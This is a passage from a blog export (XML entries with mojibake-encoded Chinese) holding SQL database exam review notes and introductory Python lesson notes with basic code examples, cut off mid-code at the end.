      </tags>
  </entry>
  <entry>
    <title>æ•°æ®åº“å¤ä¹ </title>
    <url>/2022/06/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸‰ç« ">ç¬¬ä¸‰ç« </h1>
<h2 id="åŸºæœ¬ç±»å‹">åŸºæœ¬ç±»å‹</h2>
<p>char(n)å›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²ã€‚</p>
<p>varchar(n)å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œæœ€å¤§é•¿åº¦nã€‚</p>
<p>int æ•´æ•°ã€‚</p>
<p>smallint å°æ•´æ•°ã€‚</p>
<p>numeric(p,d)å®šç‚¹æ•°ï¼Œpä½æ•°å­—å…¶ä¸­dä½åœ¨å°æ•°ç‚¹å³è¾¹ã€‚</p>
<span id="more"></span>
<p>float(n)ç²¾åº¦è‡³å°‘ä¸ºnçš„æµ®ç‚¹æ•°ã€‚</p>
<p>åˆ›å»ºä¸€ä¸ªè¡¨:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> department</span><br><span class="line">(</span><br><span class="line">    dept_name <span class="type">varchar</span>(<span class="number">20</span>), #æœ€å¤§é•¿åº¦ä¸º<span class="number">20</span>çš„å­—ç¬¦ä¸²</span><br><span class="line">    building <span class="type">varchar</span>(<span class="number">15</span>), # æœ€å¤§é•¿åº¦ä¸º<span class="number">15</span>çš„å­—ç¬¦ä¸²</span><br><span class="line">    budget <span class="type">numeric</span>(<span class="number">12</span>, <span class="number">2</span>), # <span class="number">12</span>ä½æ•°ï¼Œ<span class="number">2</span>ä½å°æ•°</span><br><span class="line">    <span class="keyword">primary</span> key (dept_name) # ä¸»ç æ˜¯dept_nameï¼Œå¯é€‰</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>sqlæŸ¥è¯¢çš„åŸºæœ¬ç»“æ„ï¼šselectã€fromã€whereã€‚æŸ¥è¯¢åä¼šå‡ºç°é‡å¤ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> dept_name # <span class="keyword">distinct</span>å¼ºè¡Œå»é™¤é‡å¤</span><br><span class="line"><span class="keyword">from</span> instructor;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">all</span> dept_name # <span class="keyword">all</span>æ˜¾å¼æŒ‡æ˜ä¸å»é™¤é‡å¤</span><br><span class="line"><span class="keyword">from</span> instructor; </span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name</span><br><span class="line"><span class="keyword">from</span> instructor </span><br><span class="line"><span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Music&#x27;</span> <span class="keyword">and</span> salary <span class="operator">&gt;</span> <span class="number">70000</span>;</span><br></pre></td></tr></table></figure>
<h2 id="å¤šå…³ç³»æŸ¥è¯¢">å¤šå…³ç³»æŸ¥è¯¢</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, instructor.dept_name, building</span><br><span class="line"><span class="keyword">from</span> instructor,department</span><br><span class="line"><span class="keyword">where</span> instructor.dept_name<span class="operator">=</span>department.dept_name;</span><br></pre></td></tr></table></figure>
<p>selectå­å¥ç”¨äºåˆ—å‡ºæŸ¥è¯¢ç»“æœä¸­æ‰€éœ€è¦çš„å±æ€§ã€‚</p>
<p>fromå­å¥æ˜¯ä¸€ä¸ªæŸ¥è¯¢æ±‚å€¼ä¸­éœ€è¦è®¿é—®çš„å…³ç³»åˆ—è¡¨ã€‚</p>
<p>whereå­å¥æ˜¯ä¸€ä¸ªä½œç”¨åœ¨fromå­å¥ä¸­å…³ç³»çš„å±æ€§ä¸Šçš„è°“è¯ã€‚</p>
<p>é€šè¿‡fromå­å¥å®šä¹‰äº†ä¸€ä¸ªåˆ—å‡ºçš„å…³ç³»ä¸Šçš„ç¬›å¡å°”ç§¯ã€‚è‹¥æ²¡æœ‰whereåˆ™ä¼šè¾“å‡ºè¯¥ç¬›å¡å°”ç§¯ã€‚</p>
<p>SQL JOIN å­å¥ç”¨äºæŠŠæ¥è‡ªä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨çš„è¡Œç»“åˆèµ·æ¥ï¼ŒåŸºäºè¿™äº›è¡¨ä¹‹é—´çš„å…±åŒå­—æ®µã€‚</p>
<h2 id="é‡å‘½åå…³ç³»">é‡å‘½åå…³ç³»</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> T.name, S.course_id</span><br><span class="line"><span class="keyword">from</span> instructor <span class="keyword">as</span> T, teaches <span class="keyword">as</span> S</span><br><span class="line"><span class="keyword">where</span> T.ID <span class="operator">=</span> S.ID;</span><br></pre></td></tr></table></figure>
<h2 id="æ¯”è¾ƒè¿ç®—ç¬¦">æ¯”è¾ƒè¿ç®—ç¬¦</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name</span><br><span class="line"><span class="keyword">from</span> department </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">like</span> <span class="string">&#x27;%Watson%&#x27;</span>; # åŒ¹é…å­ä¸²åŒ…å«Watsonçš„å­—ç¬¦ä¸²</span><br><span class="line"><span class="keyword">like</span> <span class="string">&#x27;ab\%cd%&#x27;</span> <span class="keyword">escape</span> <span class="string">&#x27;\&#x27;</span> # ç”¨<span class="keyword">escape</span>è½¬ä¹‰ï¼ŒåŒ¹é…ä»¥ab<span class="operator">%</span>cdå¼€å¤´çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>
<h2 id="æ˜¾ç¤ºæ¬¡åº">æ˜¾ç¤ºæ¬¡åº</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name </span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Physics&#x27;</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> name;</span><br></pre></td></tr></table></figure>
<p>##ã€€å‡é™åº</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> salary <span class="keyword">desc</span>, name <span class="keyword">asc</span>; # å·¥èµ„é™åºæ’åˆ—ï¼Œè‹¥å·¥èµ„ç›¸åŒåˆ™å§“åå‡åºæ’åˆ—ã€‚</span><br></pre></td></tr></table></figure>
<h2 id="whereå­å¥">whereå­å¥</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">where</span> salary <span class="keyword">between</span> <span class="number">90000</span> <span class="keyword">and</span> <span class="number">100000</span>;</span><br></pre></td></tr></table></figure>
<h2 id="è®°å·æ¯”è¾ƒ">è®°å·æ¯”è¾ƒ</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,course_id</span><br><span class="line"><span class="keyword">from</span> instructor,teaches</span><br><span class="line"><span class="keyword">where</span> (instructor.ID, dept_name)<span class="operator">=</span>(teaches.ID, <span class="string">&#x27;Biology&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="é›†åˆè¿ç®—">é›†åˆè¿ç®—</h2>
<p>é‡‡ç”¨union,intersect,exceptå¯¹åº”å¹¶ï¼Œäº¤ï¼Œå·®</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> course_id</span><br><span class="line">    <span class="keyword">from</span> section</span><br><span class="line">    <span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Fall&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2009</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> course_id</span><br><span class="line">    <span class="keyword">from</span> section</span><br><span class="line">    <span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Spring&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2010</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>unionè‡ªåŠ¨å»é‡ã€‚</p>
<h2 id="ç©ºå€¼">ç©ºå€¼</h2>
<p>ç©ºå€¼ä¸true,falseå¯¹åº”ï¼Œä¸ºunknownã€‚ç©ºå€¼ä¸ä»»ä½•å€¼è¿ç®—ä¸ºç©ºå€¼ã€‚</p>
<h2 id="èšé›†å‡½æ•°">èšé›†å‡½æ•°</h2>
<p>å¹³å‡å€¼ï¼šavg</p>
<p>æœ€å°å€¼ï¼šmin</p>
<p>æœ€å¤§å€¼ï¼šmax</p>
<p>æ€»å’Œï¼šsum</p>
<p>è®¡æ•°ï¼šcount</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(salary)</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Music&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="åˆ†ç»„èšé›†">åˆ†ç»„èšé›†</h2>
<p>group by</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name, ave(salary) <span class="keyword">as</span> avg_salary</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> dept_name;</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢æ¯ä¸ªå­¦ç§‘çš„å¹³å‡å·¥èµ„ï¼Œæ¯ä¸ªå­¦ç§‘è¢«å½“ä½œä¸€ä¸ªåˆ†ç»„ã€‚</p>
<p>ä»»ä½•æ²¡æœ‰å‡ºç°åœ¨group byå­å¥ä¸­çš„å±æ€§å¦‚æœå‡ºç°åœ¨selectä¸­çš„è¯ï¼Œåªèƒ½å‡ºç°åœ¨èšé›†å‡½æ•°å†…ã€‚</p>
<h2 id="havingå­å¥">havingå­å¥</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name, <span class="built_in">avg</span>(salary) <span class="keyword">as</span> avg_salary</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> dept_name</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">avg</span>(salary) <span class="operator">&gt;</span> <span class="number">42000</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æœ€å…ˆæ ¹æ®fromå­å¥è®¡ç®—å‡ºä¸€ä¸ªå…³ç³»ã€‚</p>
<p>å¦‚æœå‡ºç°whereå­å¥ï¼Œwhereå­å¥ä¸­çš„è°“è¯å°†åº”ç”¨åˆ°fromå­å¥è®¡ç®—çš„ç»“æœä¸Šã€‚</p>
<p>å¦‚æœå‡ºç°group byå­å¥ï¼Œæ»¡è¶³whereè°“è¯çš„å…ƒç»„é€šè¿‡group byå­å¥å½¢æˆåˆ†ç»„ã€‚</p>
<p>å¦‚æœå‡ºç°havingå­å¥ï¼Œä¸æ»¡è¶³havingå­å¥è°“è¯çš„åˆ†ç»„å°†è¢«æŠ›å¼ƒã€‚</p>
<p>selectå­å¥åˆ©ç”¨å‰©ä¸‹çš„åˆ†ç»„äº§ç”Ÿå‡ºæŸ¥è¯¢ç»“æœä¸­çš„å…ƒç»„ã€‚</p>
</blockquote>
<h2 id="åµŒå¥—æŸ¥è¯¢">åµŒå¥—æŸ¥è¯¢</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> course_id</span><br><span class="line"><span class="keyword">from</span> section</span><br><span class="line"><span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Fall&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2009</span> <span class="keyword">and</span></span><br><span class="line">course_id <span class="keyword">in</span> (<span class="keyword">select</span> course_id</span><br><span class="line">              <span class="keyword">from</span> section</span><br><span class="line">              <span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Spring&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2010</span>);</span><br></pre></td></tr></table></figure>
<h2 id="é›†åˆçš„æ¯”è¾ƒ">é›†åˆçš„æ¯”è¾ƒ</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name</span><br><span class="line"><span class="keyword">from</span> instructor </span><br><span class="line"><span class="keyword">where</span> salary <span class="operator">&gt;</span> <span class="keyword">some</span>(<span class="keyword">select</span> salary</span><br><span class="line">                   <span class="keyword">from</span> instructor</span><br><span class="line">                   <span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Biology&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>someè¡¨ç¤ºè‡³å°‘æ¯”æŸä¸€ä¸ªå¤§ã€‚</p>
<h2 id="fromå­æŸ¥è¯¢æ›¿ä»£having">fromå­æŸ¥è¯¢æ›¿ä»£having</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name, avg_salary</span><br><span class="line"><span class="keyword">from</span>(<span class="keyword">select</span> dept_name,<span class="built_in">avg</span>(salary) <span class="keyword">as</span> avg_salary</span><br><span class="line">    <span class="keyword">from</span> instructor</span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> dept name)</span><br><span class="line">    <span class="keyword">as</span> dept_avg(dept_name, avg_salary) # é‡å‘½åå­æŸ¥è¯¢çš„ç»“æœ</span><br><span class="line"><span class="keyword">where</span> avg_salary <span class="operator">&gt;</span> <span class="number">42000</span>;</span><br></pre></td></tr></table></figure>
<h2 id="withå­å¥">withå­å¥</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> max_budget(<span class="keyword">value</span>) <span class="keyword">as</span> </span><br><span class="line">	(<span class="keyword">select</span> <span class="built_in">max</span>(budget)</span><br><span class="line">    <span class="keyword">from</span> department)</span><br><span class="line"><span class="keyword">select</span> budget</span><br><span class="line"><span class="keyword">from</span> department, max_budget</span><br><span class="line"><span class="keyword">where</span> department.budget <span class="operator">=</span> max_budget.value;</span><br></pre></td></tr></table></figure>
<p>withå­å¥å®šä¹‰ä¸´æ—¶å…³ç³»max_budgetï¼Œåœ¨éšåçš„æŸ¥è¯¢ä¸­ä½¿ç”¨ã€‚</p>
<h2 id="æ•°æ®åº“çš„ä¿®æ”¹">æ•°æ®åº“çš„ä¿®æ”¹</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> r</span><br><span class="line"><span class="keyword">where</span> P;</span><br></pre></td></tr></table></figure>
<p>deleteåªèƒ½ä½œç”¨äºä¸€ä¸ªå…³ç³»ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course</span><br><span class="line">	<span class="keyword">values</span>(<span class="string">&#x27;CS-437&#x27;</span>,<span class="string">&#x27;Database Systems&#x27;</span>, <span class="string">&#x27;Comp. Sci&#x27;</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢æ’å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> instructor</span><br><span class="line">	<span class="keyword">select</span> ID, name, dept_name, <span class="number">18000</span></span><br><span class="line">	<span class="keyword">from</span> student</span><br><span class="line">	<span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Music&#x27;</span> <span class="keyword">and</span> tot_cred <span class="operator">&gt;</span> <span class="number">144</span>;</span><br></pre></td></tr></table></figure>
<p>æ¯ä¸ªéŸ³ä¹ç³»çš„å­¦åˆ†å¤§äº144çš„å­¦ç”ŸåŠ å…¥æ•™å¸ˆé˜Ÿä¼ï¼Œå·¥èµ„18000.</p>
<p>æ›´æ–°</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> instructor</span><br><span class="line"><span class="keyword">set</span> salary <span class="operator">=</span> salary<span class="operator">*</span><span class="number">1.05</span></span><br><span class="line"><span class="keyword">where</span> salary <span class="operator">&lt;</span> <span class="number">70000</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æœŸæœ«å¤ä¹ </category>
      </categories>
      <tags>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸€æ¬¡ä¾‹ä¼š-pythonåŸºç¡€</title>
    <url>/2022/09/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BE%8B%E4%BC%9A-python%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="pythonåŸºç¡€">pythonåŸºç¡€</h1>
<h2 id="åŸºç¡€è¯­æ³•ä¸è§„åˆ™">1.åŸºç¡€è¯­æ³•ä¸è§„åˆ™</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>) <span class="comment">#å•å¼•å·</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>) <span class="comment">#åŒå¼•å·</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>) <span class="comment">#è¾“å…¥</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>å¯ä»¥çœ‹å‡ºï¼Œåœ¨æ‰“å°å­—ç¬¦ä¸²æ—¶ï¼Œä½¿ç”¨å•å¼•å·å’ŒåŒå¼•å·ç»“æœç›¸åŒã€‚é‚£ä¸ºä»€ä¹ˆè¦åŒæ—¶æ”¯æŒå•å¼•å·å’ŒåŒå¼•å·å‘¢ï¼Ÿå°è¯•è¾“å‡º Let's go!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Let&#x27;</span>s go!<span class="string">&#x27;) # æŠ¥é”™</span></span><br><span class="line"><span class="string">print(&quot;Let&#x27;</span>s go!<span class="string">&quot;) #æ­£å¸¸è¿è¡Œ</span></span><br><span class="line"><span class="string">print(&#x27;Let\&#x27;s go!&#x27;) #è½¬ä¹‰åæ­£å¸¸è¿è¡Œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨å•å¼•å·</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">å¤šè¡Œæ³¨é‡Šï¼Œä½¿ç”¨åŒå¼•å·</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>å­¦ä¹  Python ä¸å…¶ä»–è¯­è¨€æœ€å¤§çš„åŒºåˆ«å°±æ˜¯ï¼ŒPython çš„ä»£ç å—ä¸ä½¿ç”¨å¤§æ‹¬å· {} æ¥æ§åˆ¶ç±»ï¼Œå‡½æ•°ä»¥åŠå…¶ä»–é€»è¾‘åˆ¤æ–­ã€‚python æœ€å…·ç‰¹è‰²çš„å°±æ˜¯ç”¨ç¼©è¿›æ¥å†™æ¨¡å—ã€‚ç¼©è¿›çš„ç©ºç™½æ•°é‡æ˜¯å¯å˜çš„ï¼Œä½†æ˜¯æ‰€æœ‰ä»£ç å—è¯­å¥å¿…é¡»åŒ…å«ç›¸åŒçš„ç¼©è¿›ç©ºç™½æ•°é‡ï¼Œè¿™ä¸ªå¿…é¡»ä¸¥æ ¼æ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">False</span>) <span class="comment">#æ­£å¸¸æ‰§è¡Œ</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="literal">False</span>) <span class="comment">#æŠ¥é”™</span></span><br><span class="line">ä¸€ä¸ªä»£ç å—å†…ç”¨ä¸€ä¸ªç¼©è¿›ï¼Œ</span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="literal">False</span>) <span class="comment">#å¯æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>
<p>pythonæ˜¯ä¸€é—¨é¢å‘å¯¹è±¡çš„è§£é‡Šå‹è¯­è¨€ï¼Œä¸éœ€è¦åœ¨è¿è¡Œå‰ç¼–è¯‘ï¼Œæ‰€ä»¥pythonè¿ç®—é€Ÿåº¦æ¯”cè¾ƒä¸ºç¼“æ…¢ã€‚</p>
<h3 id="pythonä¿ç•™å­—">pythonä¿ç•™å­—</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)</span><br></pre></td></tr></table></figure>
<h3 id="å¤šè¡Œè¯­å¥ä¸å•è¡Œæ‰§è¡Œ">å¤šè¡Œè¯­å¥ä¸å•è¡Œæ‰§è¡Œ</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = <span class="number">3</span></span><br><span class="line">total = a + \</span><br><span class="line">b + \</span><br><span class="line">c</span><br><span class="line"><span class="built_in">print</span>(total)</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span>;b = <span class="number">2</span>;c = <span class="number">3</span></span><br><span class="line">total = a + b + c</span><br><span class="line"><span class="built_in">print</span>(total)</span><br></pre></td></tr></table></figure>
<h3 id="å˜é‡èµ‹å€¼">å˜é‡èµ‹å€¼</h3>
<p>pythonä¸cä¸åŒï¼Œpythonèµ‹å€¼å¹¶ä¸éœ€è¦é¢„å…ˆå®šä¹‰ï¼Œä¹Ÿä¸éœ€è¦æŒ‡å®šå˜é‡çš„æ•°æ®ç±»å‹ï¼Œè§£é‡Šå™¨ä¼šè‡ªè¡Œåˆ¤æ–­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span> <span class="comment">#int</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line">a = <span class="string">&#x27;123&#x27;</span> <span class="comment">#string</span></span><br><span class="line">a = b = c = d = <span class="number">1</span> <span class="comment">#è¿ç»­èµ‹å€¼</span></span><br><span class="line">a, b = <span class="number">1</span>, <span class="string">&#x27;string&#x27;</span> <span class="comment">#è§£åŒ…èµ‹å€¼</span></span><br></pre></td></tr></table></figure>
<h2 id="åŸºæœ¬æ•°æ®ç±»å‹">2.åŸºæœ¬æ•°æ®ç±»å‹</h2>
<p>pythonåŸºæœ¬æ•°æ®ç±»å‹ï¼šæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œé›†åˆï¼Œå­—å…¸</p>
<h3 id="æ•°å€¼">æ•°å€¼</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(a.bit_length())</span><br><span class="line"><span class="built_in">print</span>(a.__abs__())</span><br><span class="line"><span class="built_in">print</span>(a.__add__(<span class="number">23</span>))</span><br><span class="line"><span class="number">2</span> / <span class="number">4</span> <span class="comment">#å°æ•°é™¤</span></span><br><span class="line"><span class="number">2</span> // <span class="number">4</span> <span class="comment">#æ•´æ•°é™¤</span></span><br><span class="line"><span class="number">17</span> % <span class="number">4</span> <span class="comment">#å–æ¨¡</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">3</span> <span class="comment">#æ±‚å¹‚</span></span><br><span class="line"><span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">#æ±‚æ¨¡å¹‚</span></span><br></pre></td></tr></table></figure>
<h3 id="å­—ç¬¦ä¸²">å­—ç¬¦ä¸²</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">1</span>:<span class="number">3</span>]) <span class="comment">#å­—ç¬¦ä¸²åˆ‡ç‰‡ åŒ…æ‹¬1ä¸åŒ…æ‹¬3</span></span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">4</span>]) <span class="comment">#å­—ç¬¦ä¸²ç´¢å¼•</span></span><br><span class="line"><span class="built_in">print</span>(c[-<span class="number">1</span>]) <span class="comment">#ä»åå¾€å‰ç´¢å¼•ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸º-1</span></span><br><span class="line"><span class="built_in">print</span>(c[-<span class="number">3</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(c[:<span class="number">3</span>]) <span class="comment">#ä»å¤´å¼€å§‹</span></span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">3</span>:]) <span class="comment">#åˆ°å°¾ç»“æŸ</span></span><br></pre></td></tr></table></figure>
<h4 id="å­—ç¬¦ä¸²è¿ç®—">å­—ç¬¦ä¸²è¿ç®—</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a + b)</span><br><span class="line"><span class="built_in">print</span>(a * <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æˆ‘å« %s ä»Šå¹´ %d å²!&quot;</span> % (<span class="string">&#x27;å°æ˜&#x27;</span>, <span class="number">10</span>)) <span class="comment"># æ ¼å¼åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;æˆ‘å«<span class="subst">&#123;a&#125;</span>ä»Šå¹´<span class="subst">&#123;b&#125;</span>å²&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="å†…å»ºå‡½æ•°">å†…å»ºå‡½æ•°</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = a.join(<span class="string">&#x27;~~~~&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.lstrip(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.rstrip(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.replace(<span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;-&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="ç±»å‹è½¬æ¢">ç±»å‹è½¬æ¢</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">123</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(a), <span class="number">16</span>)) <span class="comment">#å¯ä»¥æŒ‡å®šè¿›åˆ¶</span></span><br></pre></td></tr></table></figure>
<h2 id="åˆ—è¡¨">3.åˆ—è¡¨</h2>
<p>åˆ—è¡¨ç›¸å½“äºcçš„æ•°ç»„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] <span class="comment">#åˆ›å»ºåˆ—è¡¨</span></span><br><span class="line">a.append(<span class="number">6</span>) <span class="comment">#æ·»åŠ å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">del</span> a[<span class="number">3</span>] <span class="comment">#åˆ é™¤å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = [a, a, a] <span class="comment">#åˆ—è¡¨åµŒå¥—ï¼ˆäºŒç»´æ•°ç»„ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(b[<span class="number">1</span>][<span 